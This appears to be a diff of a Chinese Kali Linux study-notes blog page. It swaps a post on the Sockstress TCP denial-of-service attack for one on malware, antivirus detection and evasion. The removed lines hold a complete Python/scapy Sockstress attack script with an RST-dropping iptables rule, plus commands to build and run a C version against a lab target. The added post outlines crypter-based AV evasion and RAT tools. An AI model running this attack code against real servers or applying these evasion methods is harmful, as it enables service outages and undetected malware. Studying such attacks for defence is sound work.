@@ -79,18 +79,16 @@
 
 
 
-<meta name="description" content="1. Sockstress 2008年由Jack C.Louis发现 针对TCP服务的拒绝服务攻击 消耗被攻击目标系统资源，不消耗网络带宽自宽 与攻击目标建立socket连接 ▲ 设计原理：完成三次握手，最后的ACK包window大小为0（客户端不接收数据） 攻击者资源消耗小（CPU、内存、带宽） 异步攻击，单机可拒绝服务高配资源服务器 Window窗口实现TCP流控    2. 实验准备 Ka">
+<meta name="description" content="1. 恶意软件 病毒、木马、蠕虫、键盘记录、僵尸程序、流氓软件、勒索软件、广告程序 在用户非自愿的情况下执行安装 出于某种恶意的目的：控制、窃取、勒索、偷窥、推送、攻击…  2. 防病毒软件 恶意程序最主要的防护手段 杀毒软件&#x2F;防病毒软件 客户端&#x2F;服务器&#x2F;邮件防病毒（OS上，查看邮件流&#x2F;防火墙后，对邮件流进行查杀）   检测原理 基于二进制文件中特征签名的黑名单检测方法（病毒特征库） 基于行为的">
 <meta name="keywords" content="安全">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Kali Linux笔记(八十一)：Sockstress">
-<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;02&#x2F;09&#x2F;Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%85%AB%E5%8D%81%E4%B8%80)%EF%BC%9ASockstress&#x2F;index.html">
+<meta property="og:title" content="Kali Linux笔记(八十八)：恶意软件、防病毒软件、当前现状">
+<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;02&#x2F;13&#x2F;Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%85%AB%E5%8D%81%E5%85%AB)%EF%BC%9A%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6%E3%80%81%E9%98%B2%E7%97%85%E6%AF%92%E8%BD%AF%E4%BB%B6%E3%80%81%E5%BD%93%E5%89%8D%E7%8E%B0%E7%8A%B6&#x2F;index.html">
 <meta property="og:site_name" content="Tomas&#39;Blog">
-<meta property="og:description" content="1. Sockstress 2008年由Jack C.Louis发现 针对TCP服务的拒绝服务攻击 消耗被攻击目标系统资源，不消耗网络带宽自宽 与攻击目标建立socket连接 ▲ 设计原理：完成三次握手，最后的ACK包window大小为0（客户端不接收数据） 攻击者资源消耗小（CPU、内存、带宽） 异步攻击，单机可拒绝服务高配资源服务器 Window窗口实现TCP流控    2. 实验准备 Ka">
+<meta property="og:description" content="1. 恶意软件 病毒、木马、蠕虫、键盘记录、僵尸程序、流氓软件、勒索软件、广告程序 在用户非自愿的情况下执行安装 出于某种恶意的目的：控制、窃取、勒索、偷窥、推送、攻击…  2. 防病毒软件 恶意程序最主要的防护手段 杀毒软件&#x2F;防病毒软件 客户端&#x2F;服务器&#x2F;邮件防病毒（OS上，查看邮件流&#x2F;防火墙后，对邮件流进行查杀）   检测原理 基于二进制文件中特征签名的黑名单检测方法（病毒特征库） 基于行为的">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="http:&#x2F;&#x2F;aliyun.wuyidaxue.top:8088&#x2F;kodex&#x2F;index.php?user&#x2F;publicLink&amp;fid=ecf9kHo1arl_kZP61rNqhSJunjTth3MCHAa59FVQyZfJl_RpsW_Ym-SlfpGWCtf8I1vQfSxITqNiaWpLQLK_Eiaia2B9ayVj4sb7CILix1uDs6rSN87fVmVuNJCrlyeMWRMykM0zJqVR_XWZ4w&amp;file_name=&#x2F;sockstress%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%B5%84%E6%BA%90%E5%9B%BE.PNG">
-<meta property="og:updated_time" content="2020-02-09T13:38:42.453Z">
+<meta property="og:updated_time" content="2020-02-13T08:13:41.299Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http:&#x2F;&#x2F;aliyun.wuyidaxue.top:8088&#x2F;kodex&#x2F;index.php?user&#x2F;publicLink&amp;fid=ecf9kHo1arl_kZP61rNqhSJunjTth3MCHAa59FVQyZfJl_RpsW_Ym-SlfpGWCtf8I1vQfSxITqNiaWpLQLK_Eiaia2B9ayVj4sb7CILix1uDs6rSN87fVmVuNJCrlyeMWRMykM0zJqVR_XWZ4w&amp;file_name=&#x2F;sockstress%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%B5%84%E6%BA%90%E5%9B%BE.PNG">
 
 
 
@@ -120,13 +118,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2020/02/09/Kali Linux笔记(八十一)：Sockstress/"/>
+  <link rel="canonical" href="http://yoursite.com/2020/02/13/Kali Linux笔记(八十八)：恶意软件、防病毒软件、当前现状/"/>
 
 
 
 
 
-  <title>Kali Linux笔记(八十一)：Sockstress | Tomas'Blog</title>
+  <title>Kali Linux笔记(八十八)：恶意软件、防病毒软件、当前现状 | Tomas'Blog</title>
   
 
 
@@ -245,7 +243,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/09/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%85%AB%E5%8D%81%E4%B8%80)%EF%BC%9ASockstress/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/13/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%85%AB%E5%8D%81%E5%85%AB)%EF%BC%9A%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6%E3%80%81%E9%98%B2%E7%97%85%E6%AF%92%E8%BD%AF%E4%BB%B6%E3%80%81%E5%BD%93%E5%89%8D%E7%8E%B0%E7%8A%B6/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Tomas">
@@ -262,7 +260,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">Kali Linux笔记(八十一)：Sockstress</h1>
+          <h1 class="post-title" itemprop="name headline">Kali Linux笔记(八十八)：恶意软件、防病毒软件、当前现状</h1>
         
 
         <div class="post-meta">
@@ -274,8 +272,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-02-09T21:34:04+08:00">
-                2020-02-09
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-02-13T16:18:23+08:00">
+                2020-02-13
               </time>
             
 
@@ -328,7 +326,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  857 字
+                  590 字
                 </span>
               
 
@@ -344,7 +342,7 @@
                   <span class="post-meta-item-text">阅读时长 &asymp;</span>
                 
                 <span title="阅读时长">
-                  3 分钟
+                  2 分钟
                 </span>
               
             </div>
@@ -366,83 +364,79 @@
 
       
         <hr>
-<h4 id="1-Sockstress"><a href="#1-Sockstress" class="headerlink" title="1. Sockstress"></a>1. Sockstress</h4><ul>
-<li>2008年由Jack C.Louis发现</li>
-<li>针对TCP服务的拒绝服务攻击<ul>
-<li>消耗被攻击目标系统资源，不消耗网络带宽自宽</li>
-<li>与攻击目标建立socket连接</li>
-<li>▲ 设计原理：完成三次握手，最后的ACK包window大小为0（客户端不接收数据）</li>
-<li>攻击者资源消耗小（CPU、内存、带宽）</li>
-<li>异步攻击，单机可拒绝服务高配资源服务器</li>
-<li>Window窗口实现TCP流控</li>
+<h4 id="1-恶意软件"><a href="#1-恶意软件" class="headerlink" title="1. 恶意软件"></a>1. 恶意软件</h4><ul>
+<li>病毒、木马、蠕虫、键盘记录、僵尸程序、流氓软件、勒索软件、广告程序</li>
+<li>在用户非自愿的情况下执行安装</li>
+<li>出于某种恶意的目的：控制、窃取、勒索、偷窥、推送、攻击…</li>
+</ul>
+<h4 id="2-防病毒软件"><a href="#2-防病毒软件" class="headerlink" title="2. 防病毒软件"></a>2. 防病毒软件</h4><ul>
+<li>恶意程序最主要的防护手段<ul>
+<li>杀毒软件/防病毒软件</li>
+<li>客户端/服务器/邮件防病毒（OS上，查看邮件流/防火墙后，对邮件流进行查杀）</li>
+</ul>
+</li>
+<li>检测原理<ul>
+<li>基于二进制文件中特征签名的黑名单检测方法（病毒特征库）</li>
+<li>基于行为的分析方法（启发式）</li>
+</ul>
+</li>
+<li>事后手段<ul>
+<li>永远落后于病毒发展</li>
 </ul>
 </li>
 </ul>
-<h4 id="2-实验准备"><a href="#2-实验准备" class="headerlink" title="2. 实验准备"></a>2. 实验准备</h4><ul>
-<li>Kali（攻击者）<ul>
-<li>网卡方式为NAT/Bridge方式，NAT/桥接到无线网络，检查网络</li>
+<h4 id="3-免杀技术"><a href="#3-免杀技术" class="headerlink" title="3. 免杀技术"></a>3. 免杀技术</h4><ul>
+<li>修改二进制文件中的特征字符<ul>
+<li>替换、擦除、修改</li>
 </ul>
 </li>
-<li>Metasploit（被攻击者）<ul>
-<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
+<li>加密技术（crypter）<ul>
+<li>通过加密使得特征字符不可读，从而逃避AV检测</li>
+<li>运行时分片分段的解密执行，注入进程或AV不检查的无害文件中</li>
 </ul>
 </li>
-</ul>
-<h4 id="3-实验–Python脚本"><a href="#3-实验–Python脚本" class="headerlink" title="3. 实验–Python脚本"></a>3. 实验–Python脚本</h4><ul>
-<li>Metasploit（被攻击者）<ul>
-<li><strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
-</ul>
-</li>
-<li>Kali（攻击者）<ul>
-<li>python脚本：<strong><code>🔺命令：./sockstress.py Metasploit的IP 21 200</code></strong></li>
-<li>▲ 2020.2.9此脚本攻击效果甚微弱</li>
+<li>防病毒软件的检测<ul>
+<li>恶意程序本身的特征字符</li>
+<li>加密器crypter的特征字符</li>
 </ul>
 </li>
 </ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">#_*_ coding:utf-8 _*_</span><br><span class="line"></span><br><span class="line">from scapy.all import *</span><br><span class="line">from time import sleep</span><br><span class="line">import thread</span><br><span class="line">import logging</span><br><span class="line">import os</span><br><span class="line">import signal</span><br><span class="line">import sys</span><br><span class="line">logging.getLogger(&quot;scapy.runtime&quot;).setLevel(logging.ERROR)</span><br><span class="line"></span><br><span class="line">if len(sys.argv) != 4:</span><br><span class="line">    print &quot;用法：./sockstress.py [目标IP] [端口] [线程数]&quot;</span><br><span class="line">    print &quot;举例：./sockstress.py 10.0.0.5 21 20 ## 请确定被攻击端口处于开放状态&quot;</span><br><span class="line">    sys.exit()</span><br><span class="line"></span><br><span class="line">target = str(sys.argv[1])</span><br><span class="line">dstport = int(sys.argv[2])</span><br><span class="line">threads = int(sys.argv[3])</span><br><span class="line"></span><br><span class="line">## 攻击函数</span><br><span class="line">def sockstress(target,dstport):</span><br><span class="line">    while 0 == 0:</span><br><span class="line">        try:</span><br><span class="line">            x = random.randint(0,65535)</span><br><span class="line">            response = sr1(IP(dst=target)/TCP(sport=x,dport=dstport,flags=&quot;S&quot;),timeout=1,verbose=0)</span><br><span class="line">            send(IP(dst=target)/TCP(sport=x,dport=dstport,window=0,flags=&quot;A&quot;,ack=(response[TCP].seq+1))/&apos;\x00\x00&apos;,verbose=0)</span><br><span class="line">        except:</span><br><span class="line">            pass</span><br><span class="line"></span><br><span class="line">## 停止攻击函数</span><br><span class="line">def shutdown(signal,frame):</span><br><span class="line">    print &quot;正在恢复iptables 规则&quot;</span><br><span class="line">    os.system(&apos;iptables -D OUTPUT -p tcp --tcp-flags RST RST -d&apos;+target+&apos; -j DROP&apos;)</span><br><span class="line">    sys.exit()</span><br><span class="line"></span><br><span class="line">## 添加iptables规则</span><br><span class="line">os.system(&apos;iptables -A OUTPUT -p tcp --tcp-flags RST RST -d&apos;+target+&apos; -j DROP&apos;)</span><br><span class="line">signal.signal(signal.SIGINT,shutdown)</span><br><span class="line"></span><br><span class="line">## 多线程攻击</span><br><span class="line">print &quot;\n攻击正在进行...按 Ctrl+C 停止攻击&quot;</span><br><span class="line">for x in range(0,threads):</span><br><span class="line">    thread.start_new_thread(sockstress,(target,dstport))</span><br><span class="line"></span><br><span class="line">## 永远执行</span><br><span class="line">while 0==0:</span><br><span class="line">    sleep(1)</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>Metasploit（被攻击者）<ul>
-<li><strong><code>🔺命令：top</code></strong>查看系统性能，重点关注CPU、内存、SWAP是否提高或者不变</li>
-<li><strong><code>🔺命令：netstat -pantu | grep ESTAB | wc -l</code></strong>（查看已经建立的连接数）</li>
-<li><strong><code>🔺命令：Free -m</code></strong>（查看系统所用资源）</li>
+<h4 id="4-当前现状"><a href="#4-当前现状" class="headerlink" title="4. 当前现状"></a>4. 当前现状</h4><ul>
+<li>恶意软件制造者<ul>
+<li>编写私有RAT软件，避免普遍被AV所知的特征字符</li>
+<li>使用独有crypter软件加密恶意程序</li>
+<li>处事低调，尽量避免被发现</li>
+<li>没有能力自己编写恶意代码的黑客，通过直接修改特征码的方式免杀</li>
+<li>Fully UnDetectable是最高追求（FUD）</li>
+</ul>
+</li>
+<li>AV厂商<ul>
+<li>广泛采集样本，尽快发现新出现的恶意程序，更新病毒库</li>
+<li>一般新的恶意软件安全UD窗口期是一周左右</li>
+<li>与恶意软件制造者永无休止的拉锯战</li>
+<li>新的启发式检测技术尚有待完善（误杀露杀）</li>
+</ul>
+</li>
+<li>单一AV厂商的病毒库很难达到100%覆盖<ul>
+<li><a href="https://www.virustotal.com/" target="_blank" rel="noopener">https://www.virustotal.com/</a><ul>
+<li>接口被某些国家的AV软件免费利用，没有自己的病毒库</li>
+</ul>
+</li>
+<li><a href="http://www.viruscan.org/" target="_blank" rel="noopener">http://www.viruscan.org/</a> ▲ 2020.2.13此网站不可用</li>
+<li>在线多引擎查杀网站与AV厂商共享信息</li>
+<li>搞黑的在线多引擎查毒站<ul>
+<li><a href="https://nodistribute.com/" target="_blank" rel="noopener">https://nodistribute.com/</a></li>
+<li><a href="http://viruscheckmate.com/check" target="_blank" rel="noopener">http://viruscheckmate.com/check</a> ▲ 2020.2.13此网站不可用</li>
 </ul>
 </li>
 </ul>
-<p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=ecf9kHo1arl_kZP61rNqhSJunjTth3MCHAa59FVQyZfJl_RpsW_Ym-SlfpGWCtf8I1vQfSxITqNiaWpLQLK_Eiaia2B9ayVj4sb7CILix1uDs6rSN87fVmVuNJCrlyeMWRMykM0zJqVR_XWZ4w&file_name=/sockstress%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%B5%84%E6%BA%90%E5%9B%BE.PNG" alt="服务器资源图"></p>
-<h4 id="4-实验–C脚本"><a href="#4-实验–C脚本" class="headerlink" title="4. 实验–C脚本"></a>4. 实验–C脚本</h4><ul>
-<li>Metasploit（被攻击者）<ul>
-<li><strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
+</li>
+<li>常用RAT软件<ul>
+<li>灰鸽子、波尔、黑暗彗星、潘多拉、NanoCore</li>
+<li>▲ 下载测试几款RAT软件</li>
+<li>▲ 2020.2.13已下载到灰鸽子、NanoCore</li>
 </ul>
 </li>
-<li>Kali（攻击者）<ul>
-<li>防火墙规则：<strong><code>🔺命令：iptables -A OUTPUT -p TCP --tcp-flags rst rst -d Metasploit的IP -j DROP</code></strong></li>
-<li>下载地址：<a href="https://github.com/defuse/sockstress" target="_blank" rel="noopener">https://github.com/defuse/sockstress</a> </li>
-<li><strong><code>🔺命令：gcc -Wall -c sockstress.c</code></strong> </li>
-<li><strong><code>🔺命令：gcc -pthread -o sockstress sockstress.o</code></strong> </li>
-<li><strong><code>🔺命令：./sockstress Metasploit的IP:80 eth0</code></strong> </li>
-<li><strong><code>🔺命令：./sockstress Metasploit的IP:80 eth0 -p payloads/http -d 10</code></strong></li>
-</ul>
-</li>
-<li>Metasploit（被攻击者）<ul>
-<li><strong><code>🔺命令：top</code></strong>查看系统性能，重点关注CPU、内存、SWAP是否提高或者不变</li>
-<li><strong><code>🔺命令：netstat -pantu | grep ESTAB | wc -l</code></strong>（查看已经建立的连接数）</li>
-<li><strong><code>🔺命令：free -m</code></strong>（查看系统所用资源）</li>
-</ul>
-</li>
-</ul>
-<h4 id="5-防御措施"><a href="#5-防御措施" class="headerlink" title="5. 防御措施"></a>5. 防御措施</h4><ul>
-<li>直到今天sockstress攻击仍然是一种很有效的DoS攻击方式</li>
-<li>由于建立完整的TCP三步握手，因此使用syn cookie防御无效（syn cookie对半步连接有效）</li>
-<li>根本的防御方法是采用白名单（不实际）</li>
-<li>折中对策：限制单位时间内每IP建的TCP连接数<ul>
-<li>封杀每30秒与80端口建立连接10个的IP地址</li>
-<li><strong><code>🔺命令：iptables -I INPUT -p tcp --dport 80 -m state --state NEW -m recent --set</code></strong></li>
-<li><strong><code>🔺命令：iptables -I INPUT -p tcp --dport 80 -m state --state NEW -m recent --update --seconds 30 --hitcount 10 -j DROP</code></strong></li>
-<li>以上规则对DDoS攻击无效</li>
-</ul>
-</li>
-<li>▲ 可在Metasploit中加入iptables规则，Kali进行DoS尝试</li>
 </ul>
 
       
@@ -474,8 +468,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2020/02/09/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%85%AB%E5%8D%81)%EF%BC%9ASmurf/" rel="next" title="Kali Linux笔记(八十)：Smurf">
-                <i class="fa fa-chevron-left"></i> Kali Linux笔记(八十)：Smurf
+              <a href="/2020/02/13/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%85%AB%E5%8D%81%E4%B8%83)%EF%BC%9ADoS%E5%B7%A5%E5%85%B7%E5%8C%85/" rel="next" title="Kali Linux笔记(八十七)：DoS工具包">
+                <i class="fa fa-chevron-left"></i> Kali Linux笔记(八十七)：DoS工具包
               </a>
             
           </div>
@@ -483,10 +477,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2020/02/09/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%85%AB%E5%8D%81%E4%BA%8C)%EF%BC%9ATearDrop/" rel="prev" title="Kali Linux笔记(八十二)：TearDrop">
-                Kali Linux笔记(八十二)：TearDrop <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -656,7 +646,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-Sockstress"><span class="nav-number">1.</span> <span class="nav-text">1. Sockstress</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-实验准备"><span class="nav-number">2.</span> <span class="nav-text">2. 实验准备</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-实验–Python脚本"><span class="nav-number">3.</span> <span class="nav-text">3. 实验–Python脚本</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4-实验–C脚本"><span class="nav-number">4.</span> <span class="nav-text">4. 实验–C脚本</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#5-防御措施"><span class="nav-number">5.</span> <span class="nav-text">5. 防御措施</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-恶意软件"><span class="nav-number">1.</span> <span class="nav-text">1. 恶意软件</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-防病毒软件"><span class="nav-number">2.</span> <span class="nav-text">2. 防病毒软件</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-免杀技术"><span class="nav-number">3.</span> <span class="nav-text">3. 免杀技术</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4-当前现状"><span class="nav-number">4.</span> <span class="nav-text">4. 当前现状</span></a></li></ol></div>
             
 
           </div>
